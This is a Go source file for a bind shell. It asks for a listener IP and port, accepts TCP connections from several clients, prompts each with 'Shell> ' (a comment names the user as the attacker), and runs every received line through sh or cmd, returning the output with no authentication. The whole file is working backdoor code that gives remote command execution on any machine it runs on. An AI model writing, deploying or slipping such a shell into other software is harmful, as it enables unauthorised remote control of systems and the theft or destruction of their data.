package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
)

var (
	connectedClients int
	mu               sync.Mutex
)

func main() {
	// Ensure the program can interact well in any terminal
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter LHOST (Listener IP): ")
	lhost, _ := reader.ReadString('\n')
	lhost = strings.TrimSpace(lhost)

	fmt.Print("Enter LPORT (Listener Port): ")
	lport, _ := reader.ReadString('\n')
	lport = strings.TrimSpace(lport)

	// Display a listening message
	address := fmt.Sprintf("%s:%s", lhost, lport)
	fmt.Printf("Listening on %s...\n", address)

	// Start listening for incoming connections
	listener, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer listener.Close()

	// Handle multiple connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		// Increment the client count
		mu.Lock()
		connectedClients++
		mu.Unlock()

		fmt.Printf("Connection established with %s\n", conn.RemoteAddr().String())
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Create a buffer for reading commands from the client
	reader := bufio.NewReader(conn)

	for {
		// Display prompt to attacker
		conn.Write([]byte("Shell> "))

		// Read input command
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("Connection closed with %s\n", conn.RemoteAddr().String())
			mu.Lock()
			connectedClients--
			mu.Unlock()
			break
		}

		// Execute the received command
		command = strings.TrimSpace(command)
		if command == "exit" {
			fmt.Printf("Connection closed with %s\n", conn.RemoteAddr().String())
			mu.Lock()
			connectedClients--
			mu.Unlock()
			break
		}

		output := executeCommand(command)
		conn.Write([]byte(output + "\n"))

		// Update users count
		mu.Lock()
		fmt.Printf("USERS: %d\n", connectedClients)
		mu.Unlock()
	}
}

func executeCommand(command string) string {
	var cmd *exec.Cmd

	// Select shell based on OS
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error executing command: %v\n%s", err, string(output))
	}
	return string(output)
}
